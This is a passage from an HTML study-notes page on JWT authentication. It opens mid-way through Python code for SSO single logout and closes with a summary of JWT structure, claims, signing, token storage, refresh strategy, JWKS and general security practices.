<a id="__codelineno-48-13" name="__codelineno-48-13" href="#__codelineno-48-13"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">revoke_sso_session</span><span class="p">(</span><span class="n">session_id</span><span class="p">)</span>
<a id="__codelineno-48-14" name="__codelineno-48-14" href="#__codelineno-48-14"></a>
<a id="__codelineno-48-15" name="__codelineno-48-15" href="#__codelineno-48-15"></a>        <span class="c1"># 2. Get all apps user is logged into</span>
<a id="__codelineno-48-16" name="__codelineno-48-16" href="#__codelineno-48-16"></a>        <span class="n">apps</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_user_apps</span><span class="p">(</span><span class="n">session_id</span><span class="p">)</span>
<a id="__codelineno-48-17" name="__codelineno-48-17" href="#__codelineno-48-17"></a>
<a id="__codelineno-48-18" name="__codelineno-48-18" href="#__codelineno-48-18"></a>        <span class="c1"># 3. Send logout notification to all apps</span>
<a id="__codelineno-48-19" name="__codelineno-48-19" href="#__codelineno-48-19"></a>        <span class="k">for</span> <span class="n">app</span> <span class="ow">in</span> <span class="n">apps</span><span class="p">:</span>
<a id="__codelineno-48-20" name="__codelineno-48-20" href="#__codelineno-48-20"></a>            <span class="bp">self</span><span class="o">.</span><span class="n">notify_app_logout</span><span class="p">(</span><span class="n">app</span><span class="p">,</span> <span class="n">user_id</span><span class="p">)</span>
<a id="__codelineno-48-21" name="__codelineno-48-21" href="#__codelineno-48-21"></a>
<a id="__codelineno-48-22" name="__codelineno-48-22" href="#__codelineno-48-22"></a>        <span class="c1"># 4. Clear session</span>
<a id="__codelineno-48-23" name="__codelineno-48-23" href="#__codelineno-48-23"></a>        <span class="k">if</span> <span class="n">session_id</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">active_sessions</span><span class="p">:</span>
<a id="__codelineno-48-24" name="__codelineno-48-24" href="#__codelineno-48-24"></a>            <span class="k">del</span> <span class="bp">self</span><span class="o">.</span><span class="n">active_sessions</span><span class="p">[</span><span class="n">session_id</span><span class="p">]</span>
<a id="__codelineno-48-25" name="__codelineno-48-25" href="#__codelineno-48-25"></a>
<a id="__codelineno-48-26" name="__codelineno-48-26" href="#__codelineno-48-26"></a>        <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;success&#39;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span> <span class="s1">&#39;apps_logged_out&#39;</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">apps</span><span class="p">)}</span>
<a id="__codelineno-48-27" name="__codelineno-48-27" href="#__codelineno-48-27"></a>
<a id="__codelineno-48-28" name="__codelineno-48-28" href="#__codelineno-48-28"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">notify_app_logout</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">app</span><span class="p">,</span> <span class="n">user_id</span><span class="p">):</span>
<a id="__codelineno-48-29" name="__codelineno-48-29" href="#__codelineno-48-29"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Send logout notification to application&quot;&quot;&quot;</span>
<a id="__codelineno-48-30" name="__codelineno-48-30" href="#__codelineno-48-30"></a>        <span class="c1"># Apps listen for logout events via:</span>
<a id="__codelineno-48-31" name="__codelineno-48-31" href="#__codelineno-48-31"></a>        <span class="c1"># - Backchannel logout (HTTP POST)</span>
<a id="__codelineno-48-32" name="__codelineno-48-32" href="#__codelineno-48-32"></a>        <span class="c1"># - Front-channel logout (iframe)</span>
<a id="__codelineno-48-33" name="__codelineno-48-33" href="#__codelineno-48-33"></a>        <span class="c1"># - Token revocation endpoint</span>
<a id="__codelineno-48-34" name="__codelineno-48-34" href="#__codelineno-48-34"></a>
<a id="__codelineno-48-35" name="__codelineno-48-35" href="#__codelineno-48-35"></a>        <span class="n">logout_token</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_logout_token</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="n">app</span><span class="p">)</span>
<a id="__codelineno-48-36" name="__codelineno-48-36" href="#__codelineno-48-36"></a>
<a id="__codelineno-48-37" name="__codelineno-48-37" href="#__codelineno-48-37"></a>        <span class="c1"># POST to app&#39;s logout endpoint</span>
<a id="__codelineno-48-38" name="__codelineno-48-38" href="#__codelineno-48-38"></a>        <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
<a id="__codelineno-48-39" name="__codelineno-48-39" href="#__codelineno-48-39"></a>            <span class="n">app</span><span class="p">[</span><span class="s1">&#39;logout_endpoint&#39;</span><span class="p">],</span>
<a id="__codelineno-48-40" name="__codelineno-48-40" href="#__codelineno-48-40"></a>            <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;logout_token&#39;</span><span class="p">:</span> <span class="n">logout_token</span><span class="p">}</span>
<a id="__codelineno-48-41" name="__codelineno-48-41" href="#__codelineno-48-41"></a>        <span class="p">)</span>
</code></pre></div>
<hr />
<h2 id="summary">Summary</h2>
<h3 id="key-concepts">Key Concepts:</h3>
<ol>
<li><strong>JWT Structure</strong>:</li>
<li>Header (algorithm + metadata)</li>
<li>Payload (claims)</li>
<li>
<p>Signature (verification)</p>
</li>
<li>
<p><strong>Claims</strong>:</p>
</li>
<li>Registered: iss, sub, aud, exp, nbf, iat, jti</li>
<li>Public: standardized claims</li>
<li>
<p>Private: custom application claims</p>
</li>
<li>
<p><strong>Signing</strong>:</p>
</li>
<li>Symmetric (HS256): Same key for sign/verify</li>
<li>
<p>Asymmetric (RS256): Private key signs, public key verifies</p>
</li>
<li>
<p><strong>Storage</strong>:</p>
</li>
<li> <strong>Best</strong>: HttpOnly cookies (XSS protection)</li>
<li> <strong>Avoid</strong>: localStorage (vulnerable to XSS)</li>
<li>
<p> <strong>High security</strong>: Memory storage (lost on refresh)</p>
</li>
<li>
<p><strong>Stateless vs Stateful</strong>:</p>
</li>
<li><strong>Pure JWT</strong>: Stateless (no DB lookup, cannot revoke)</li>
<li><strong>Hybrid</strong>: Short-lived access + stateful refresh token</li>
<li>
<p> <strong>Recommended</strong>: 15-min access + 7-day refresh</p>
</li>
<li>
<p><strong>JWS</strong>: Specification for signing JSON (JWT is a type of JWS)</p>
</li>
<li>
<p><strong>JWKS</strong>: Public key set for verifying JWTs (key rotation)</p>
</li>
<li>
<p><strong>SSO with JWT</strong>:</p>
</li>
<li>Single authentication for multiple apps</li>
<li>JWT with multiple audiences</li>
<li>OpenID Connect (OIDC) most common</li>
<li>
<p>Single logout support</p>
</li>
<li>
<p><strong>Security</strong>:</p>
</li>
<li> Use strong secrets/keys</li>
<li> Short expiration times</li>
<li> Validate all claims</li>
<li> Use HTTPS</li>
<li> Store in HttpOnly cookies</li>
<li> Never store sensitive data</li>
<li> Never use "none" algorithm</li>
</ol>
<p><strong>Best Practice Flow:</strong>
- Access token: 15 minutes (HS256/RS256) - stateless
- Refresh token: 7 days (stored server-side) - stateful
- Store in HttpOnly cookies with Secure + SameSite flags
- Rotate keys regularly
- Implement token blacklist for critical revocation
- Use SSO for multi-app environments</p>












                
              </article>
            </div>
          
          
  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>

<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      &copy; 2025 <a href="https://github.com/abhishekghoshh"  target="_blank" rel="noopener">Abhishek Ghosh</a>
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        
<div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://github.com/abhishekghoshh" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M202.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M496 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://x.com/abhishek_ghoshh" target="_blank" rel="noopener" title="x.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://www.linkedin.com/in/abhishek-ghosh-220679132/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.sections", "toc.integrate", "navigation.top", "search.suggest", "search.highlight", "content.tabs.link", "content.code.annotation", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
      
    
  </body>
</html>